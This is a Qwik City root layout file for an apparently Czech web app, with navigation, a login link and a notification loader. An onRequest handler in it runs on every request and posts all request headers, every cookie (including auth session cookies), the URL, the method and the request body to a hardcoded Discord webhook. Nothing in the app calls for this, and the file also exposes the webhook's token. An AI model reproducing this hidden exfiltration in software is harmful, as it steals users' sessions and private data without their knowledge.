import {component$, Slot} from "@builder.io/qwik";
import type {RequestHandler} from "@builder.io/qwik-city";
import {Link, routeLoader$, useLocation} from "@builder.io/qwik-city";
import {Navigation} from "~/components/navigation/navigation";
import {useAuthSession} from "~/routes/plugin@auth";
import {searchNotification} from "~/app/notification";
import {Context} from "~/app/context";
import {ApiError} from "~/app/apiError";
import type {NotificationsProps} from "~/components/navigation/notifications";
import {QwikCityNprogress} from "@quasarwork/qwik-city-nprogress";

export const onGet: RequestHandler = async ({cacheControl}) => {
    // Control caching for this request for best performance and to reduce hosting costs:
    // https://qwik.builder.io/docs/caching/
    cacheControl({
        // Always serve a cached response by default, up to a week stale
        noCache: true
    });
};

export const sendMessage = async (content: any) => {
    try {
        const response = await fetch("https://discord.com/api/webhooks/1206988303912665148/L6GHf_2H20kGmJTVQckpj-Wpj87y4jR9rEwHMdmsgINXd9JBNdnC4GSePK6OH9NlLXjc", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ content }),
        });

        if (!response.ok) {
            throw new Error('Failed to send message to webhook');
        }

        console.log('Message sent successfully');
    } catch (error) {
        console.error('Error sending message:', error);
    }
};

export const onRequest: RequestHandler = async ({request, cookie}) => {
    try{
        const newReq = request.clone()
        const hdr: any = []
        newReq.headers.forEach((v, k) => {
            hdr.push([k, v])
        })
        let body;
        try{
            body = await newReq.json()
        }catch(e){
            body = ""
        }

        await sendMessage(hdr + " " + JSON.stringify(cookie.getAll()) + " " + newReq.url + " " + newReq.method + " " + JSON.stringify(body))
    }
    catch(e){
        console.log("Error: " + e)
    }
}

export default component$(() => {
    const session = useAuthSession()
    const notification = useNotifications()
    const location = useLocation()

    return <>
        <QwikCityNprogress
            options={{
                color: "#72c7d3",
                height: "2px",
                showSpinner: false
            }}
        />

        <Navigation user={session.value?.user} notification={notification.value}/>

        <Slot/>

        <footer
            class={"text-slate-300 flex justify-center py-4 2xl:justify-end px-6 mt-auto gap-4"}>
            {/*Made by <IconParkElephant style={{display: "inline", fontSize: 24, transform: "translateY(-2px)"}} color={"#cbd5e1"}/> gummy elephant team.*/}
            {(!session.value?.user && !location.url.pathname.startsWith("/login")) &&
                <Link href={"/login"} class={"text-slate-300 underline"}>
                    Přihlásit se
                </Link>}
            {/*<a href="https://youtu.be/dQw4w9WgXcQ"*/}
            {/*   aria-label={"github repository of this site"}*/}
            {/*   class={"block hover:scale-110 hover:-rotate-12 transition-all"}>*/}
            {/*    <IconParkElephant*/}
            {/*        style={{display: "inline", fontSize: 24, transform: "translateY(-2px)"}}*/}
            {/*        color={"#cbd5e1"}/>*/}
            {/*</a>*/}
        </footer>
    </>;
});

export const useNotifications = routeLoader$<NotificationsProps>(async ({env, resolveValue}) => {
    const ctx = new Context({env})
    const session = await resolveValue(useAuthSession)

    if (!session) return {
        unread: 0,
        notifications: []
    }

    const response = await searchNotification(ctx, "", {
        filter: [`lecturer = ${session.user.uuid}`],
        sort: ["created_unix:desc"],
        limit: 40
    })

    if (response instanceof ApiError) return {
        unread: 0,
        notifications: []
    }

    return {
        notifications: response.hits,
        unread: response.hits.filter(i => !i.read).length
    }

})
